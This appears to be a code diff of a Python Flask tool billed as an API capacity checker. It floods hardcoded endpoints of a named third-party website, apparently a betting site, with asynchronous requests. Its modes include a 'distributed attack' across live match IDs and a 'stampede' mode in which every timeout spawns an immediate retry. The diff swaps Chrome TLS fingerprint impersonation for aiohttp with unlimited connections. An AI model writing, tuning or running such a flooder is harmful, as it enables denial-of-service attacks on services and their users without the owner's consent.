@@ -1,8 +1,8 @@
 """Browser-based control panel for controlled API capacity checks.
-High-Performance Async Engine powered by curl_cffi (Chrome TLS fingerprinting) + AsyncIO.
+Optimized with AsyncIO & aiohttp for ultra-low PC CPU/RAM usage.
 Supports multi-scenario simulations:
-1. Main Events Polling (/api/main-events)
-2. All Live Matches distributed attack (/api/event)
+1. Main Events Polling (/main-events)
+2. All Live Matches distributed attack (/event)
 3. Cascading Abort / Stampede storm simulation
 """
 
@@ -19,7 +19,7 @@ import time
 from collections import Counter, deque
 from urllib.parse import urlparse
 
-from curl_cffi.requests import AsyncSession
+import aiohttp
 from flask import Flask, Response, jsonify, render_template, request
 
 try:
@@ -59,52 +59,43 @@ class RunState:
         self.lock = threading.Lock()
         self.stop_event = threading.Event()
         self.total = total
+        self.started = time.perf_counter()
         self.done = 0
         self.ok = 0
         self.failed = 0
         self.bytes = 0
         self.statuses = Counter()
         self.latencies = []
-        self.recent = deque(maxlen=60)
-        self.recent_times = deque(maxlen=100)
-        self.started_at = time.time()
+        self.recent = deque(maxlen=120)  # last N latencies for the live chart
         self.finished = False
 
-    def record(self, status, latency_ms, size_bytes, error):
-        now = time.time()
+    def record(self, status, latency, size, error):
         with self.lock:
             self.done += 1
-            if status is not None and 200 <= status < 400:
+            self.latencies.append(latency)
+            self.recent.append(round(latency, 1))
+            self.bytes += size
+            if error is None and status is not None and 200 <= status < 400:
                 self.ok += 1
             else:
                 self.failed += 1
-            self.bytes += size_bytes
-            key = str(status) if status is not None else "ERR"
-            self.statuses[key] += 1
-            self.latencies.append(latency_ms)
-            self.recent.append(round(latency_ms, 1))
-            self.recent_times.append(now)
+            self.statuses[str(status) if status is not None else "ERR"] += 1
 
     def snapshot(self):
         with self.lock:
+            elapsed = max(time.perf_counter() - self.started, 1e-9)
             lat = sorted(self.latencies)
-            count = len(lat)
-            pct = lambda p: round(lat[int((count - 1) * p / 100)], 1) if count else 0
 
-            now = time.time()
-            cutoff = now - 1.0
-            recent_count = sum(1 for t in self.recent_times if t >= cutoff)
-
-            elapsed = max(now - self.started_at, 0.001)
-            achieved = round(recent_count if self.done > 5 else (self.done / elapsed), 1)
+            def pct(percent):
+                return round(lat[round((len(lat) - 1) * percent / 100)], 1) if lat else 0
 
             return {
-                "done": self.done,
                 "total": self.total,
+                "done": self.done,
                 "ok": self.ok,
                 "failed": self.failed,
-                "achieved_rps": achieved,
-                "avg_ms": round(sum(lat) / count, 1) if count else 0,
+                "achieved_rps": round(self.done / elapsed, 2),
+                "avg_ms": round(statistics.mean(lat), 1) if lat else 0,
                 "p95_ms": pct(95),
                 "p99_ms": pct(99),
                 "total_mib": round(self.bytes / 1024**2, 3),
@@ -167,76 +158,80 @@ def validate_config(data):
     return url, method, rps, duration, threads, timeout, body
 
 
-async def fetch_live_event_ids(session: AsyncSession, headers: dict):
-    """Fetches currently active match event IDs from /api/main-events with Chrome TLS fingerprint."""
+async def fetch_live_event_ids(session, headers):
+    """Fetches currently active match event IDs from /api/main-events to simulate real browsing."""
     try:
         url = "https://www.7xwon.com/api/main-events"
         payload = {"type": 0, "odds": 0, "code": False, "s": 1, "t": False}
-        resp = await session.post(url, json=payload, headers=headers, impersonate="chrome120", timeout=5.0)
-        if resp.status_code == 200:
-            data = resp.json()
-            items = []
-            if isinstance(data, dict):
-                items = data.get("data") or data.get("events") or []
-                if isinstance(items, dict):
-                    items = list(items.values())
-            elif isinstance(data, list):
-                items = data
-            ids = []
-            for item in items:
-                if isinstance(item, dict):
-                    eid = item.get("id") or item.get("eventid") or item.get("eventId")
-                    if eid:
-                        ids.append(int(eid))
-            if ids:
-                return ids
+        async with session.post(url, json=payload, headers=headers, timeout=aiohttp.ClientTimeout(total=6.0)) as resp:
+            if resp.status == 200:
+                data = await resp.json()
+                items = []
+                if isinstance(data, dict):
+                    items = data.get("data") or data.get("events") or []
+                    if isinstance(items, dict):
+                        items = list(items.values())
+                elif isinstance(data, list):
+                    items = data
+                ids = []
+                for item in items:
+                    if isinstance(item, dict):
+                        eid = item.get("id") or item.get("eventid") or item.get("eventId")
+                        if eid:
+                            ids.append(int(eid))
+                if ids:
+                    return ids
     except Exception:
         pass
-    return [36245965, 36246068, 36269546]
+    # Fallback known match IDs
+    return [36223071, 36223072, 36223073, 36223074, 36223075]
 
 
-async def _async_worker(session: AsyncSession, method: str, url: str, headers: dict, body: dict | None, timeout: float, sem: asyncio.Semaphore, state: RunState, results: list, is_cascading: bool = False):
+async def _async_worker(session, method, url, headers, body, timeout, sem, state, results, is_cascading=False):
     if state.stop_event.is_set():
         return
     async with sem:
         if state.stop_event.is_set():
             return
         started = time.perf_counter()
-        status = None
-        size = 0
-        error_msg = None
         try:
-            kwargs = {"headers": headers, "timeout": timeout, "impersonate": "chrome120"}
+            client_timeout = aiohttp.ClientTimeout(total=timeout)
+            kwargs = {"headers": headers, "timeout": client_timeout}
             if body is not None and method in {"POST", "PUT", "PATCH"}:
                 kwargs["json"] = body
 
-            if method == "POST":
-                resp = await session.post(url, **kwargs)
-            elif method == "GET":
-                resp = await session.get(url, **kwargs)
-            elif method == "PUT":
-                resp = await session.put(url, **kwargs)
-            elif method == "DELETE":
-                resp = await session.delete(url, **kwargs)
-            else:
-                resp = await session.request(method, url, **kwargs)
-
-            status = resp.status_code
-            raw = resp.content
-            size = len(raw) if raw else 0
-            if status >= 400:
-                error_msg = f"HTTP {status}"
+            async with session.request(method, url, **kwargs) as resp:
+                size = 0
+                error_msg = None
+                if resp.status >= 400:
+                    raw = await resp.read()
+                    size = len(raw)
+                    error_msg = f"HTTP {resp.status}"
+                else:
+                    async for chunk in resp.content.iter_chunked(16384):
+                        size += len(chunk)
+                
+                elapsed = (time.perf_counter() - started) * 1000
+                res = (resp.status, elapsed, size, error_msg)
+                results.append(res)
+                state.record(*res)
         except asyncio.TimeoutError:
-            error_msg = f"Timeout ({timeout:.1f}s) -> Stampede Abort" if is_cascading else f"Read timed out ({timeout}s)"
+            elapsed = (time.perf_counter() - started) * 1000
+            error_desc = f"Timeout ({timeout:.1f}s) -> Stampede Abort" if is_cascading else f"Read timed out ({timeout}s)"
+            res = (None, elapsed, 0, error_desc)
+            results.append(res)
+            state.record(*res)
+
+            # If cascading abort simulation is active: spawn an immediate retry request
+            # to simulate a client that aborts after 2.5s and immediately resends!
             if is_cascading and not state.stop_event.is_set():
                 asyncio.create_task(_async_worker(session, method, url, headers, body, timeout, sem, state, results, False))
-        except Exception as exc:
-            error_msg = str(exc)
 
-        elapsed = (time.perf_counter() - started) * 1000
-        res = (status, elapsed, size, error_msg)
-        results.append(res)
-        state.record(*res)
+        except Exception as exc:
+            elapsed = (time.perf_counter() - started) * 1000
+            res = (None, elapsed, 0, str(exc))
+            results.append(res)
+            state.record(*res)
 
 
 async def _async_run_check(url, method, rps, duration, concurrency, timeout, token, body, state, scenarios, user_agent=None, cookie=None):
@@ -252,15 +247,25 @@ async def _async_run_check(url, method, rps, duration, concurrency, timeout, tok
     sc_all_matches = scenarios.get("all_matches", False)
     sc_cascading = scenarios.get("cascading", False)
 
+    # In cascading abort simulation, client timeout is strictly 2.5 seconds
     effective_timeout = 2.5 if sc_cascading else timeout
+
     sem = asyncio.Semaphore(concurrency)
+    connector = aiohttp.TCPConnector(
+        limit=0,
+        limit_per_host=0,
+        keepalive_timeout=30.0,
+        enable_cleanup_closed=True
+    )
+
     results = []
     total_requests = rps * duration
     interval = 1.0 / rps if rps > 0 else 0
     start_time = time.perf_counter()
     tasks = []
 
-    async with AsyncSession() as session:
+    async with aiohttp.ClientSession(connector=connector) as session:
+        # Pre-fetch live event IDs if all_matches scenario is selected
         event_ids = []
         if sc_all_matches:
             event_ids = await fetch_live_event_ids(session, headers)
@@ -277,11 +282,13 @@ async def _async_run_check(url, method, rps, duration, concurrency, timeout, tok
             if pause > 0:
                 await asyncio.sleep(pause)
 
+            # Route request based on selected scenario checkboxes
             req_url = url
             req_body = body
             req_method = method
 
             if sc_main and sc_all_matches:
+                # Alternate between /api/main-events and random match /api/event
                 if index % 2 == 0:
                     req_url = "https://www.7xwon.com/api/main-events"
                     req_method = "POST"
@@ -289,12 +296,12 @@ async def _async_run_check(url, method, rps, duration, concurrency, timeout, tok
                 else:
                     req_url = "https://www.7xwon.com/api/event"
                     req_method = "POST"
-                    eid = random.choice(event_ids) if event_ids else 36245965
+                    eid = random.choice(event_ids) if event_ids else 36269546
                     req_body = {"id": eid}
             elif sc_all_matches:
                 req_url = "https://www.7xwon.com/api/event"
                 req_method = "POST"
-                eid = random.choice(event_ids) if event_ids else 36245965
+                eid = random.choice(event_ids) if event_ids else 36269546
                 req_body = {"id": eid}
             elif sc_main:
                 req_url = "https://www.7xwon.com/api/main-events"
@@ -305,9 +312,6 @@ async def _async_run_check(url, method, rps, duration, concurrency, timeout, tok
                 _async_worker(session, req_method, req_url, headers, req_body, effective_timeout, sem, state, results, sc_cascading)
             )
             tasks.append(task)
-
-            if len(tasks) > 800:
-                tasks = [t for t in tasks if not t.done()]
 
         if tasks:
             await asyncio.gather(*tasks, return_exceptions=True)
@@ -377,9 +381,9 @@ def run():
         return jsonify({"error": "Test sahipligi onayi gerekli."}), 400
 
     scenarios = data.get("scenarios") or {
-        "main": True,
-        "all_matches": True,
-        "cascading": False
+        "main": bool(data.get("sc_main")),
+        "all_matches": bool(data.get("sc_all_matches")),
+        "cascading": bool(data.get("sc_cascading"))
     }
 
     run_id = str(data.get("run_id", "")).strip()
